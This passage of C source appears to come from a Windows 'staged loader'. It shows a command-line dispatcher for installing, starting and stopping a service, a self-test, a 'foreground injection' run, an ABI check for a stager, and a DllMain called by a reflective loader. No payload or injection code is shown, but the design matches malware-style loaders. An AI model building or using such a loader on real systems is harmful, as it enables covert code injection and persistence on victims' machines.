    if (wcscmp(argv[i], L"--install") == 0) {
      return service_install();
    }
    if (wcscmp(argv[i], L"--uninstall") == 0) {
      return service_uninstall();
    }
    if (wcscmp(argv[i], L"--start") == 0) {
      return service_start_stop(1);
    }
    if (wcscmp(argv[i], L"--stop") == 0) {
      return service_start_stop(0);
    }
#endif
    if (wcscmp(argv[i], L"--selftest") == 0) {
      return selftest();
    }
    if (wcscmp(argv[i], L"--run") == 0) {
      return run_once();
    }
    if (wcscmp(argv[i], L"--help") == 0 || wcscmp(argv[i], L"-h") == 0 ||
        wcscmp(argv[i], L"help") == 0) {
      print_usage();
      return 0;
    }
  }
#ifndef STAGED_LOADER_NO_SERVICE
  print_usage();
  return 0;
#else
  /* Non-service host: no command means a single foreground injection. */
  return run_once();
#endif
}

/*
 * Compile-time guard: if StageMain's signature ever drifts from the ABI the
 * stager resolves and calls (stage_abi.h), this assignment fails to compile.
 */
static staged_loader_main_fn const g_stage_abi_check __attribute__((unused)) =
    StageMain;

/* Standard DLL entry point: the reflective loader calls this with
 * DLL_PROCESS_ATTACH to run the MinGW CRT init. */
BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
  (void)reserved;
  if (reason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(inst);
  }
  return TRUE;
}
